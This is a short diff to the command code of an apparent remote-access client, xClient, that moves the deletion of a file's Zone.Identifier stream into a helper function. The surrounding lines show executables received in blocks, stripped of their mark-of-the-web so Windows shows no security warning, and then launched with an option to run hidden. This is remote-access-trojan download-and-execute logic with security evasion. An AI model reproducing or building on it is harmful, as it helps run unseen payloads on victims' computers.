@@ -41,7 +41,7 @@ namespace xClient.Core.Commands
 
                 try
                 {
-                    NativeMethods.DeleteFile(tempFile + ":Zone.Identifier");
+                    FileHelper.DeleteZoneIdentifier(tempFile);
 
                     var bytes = File.ReadAllBytes(tempFile);
                     if (bytes[0] != 'M' && bytes[1] != 'Z')
@@ -89,7 +89,7 @@ namespace xClient.Core.Commands
 
                 if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                 {
-                    NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
+                    FileHelper.DeleteZoneIdentifier(filePath);
 
                     ProcessStartInfo startInfo = new ProcessStartInfo();
                     if (command.RunHidden)
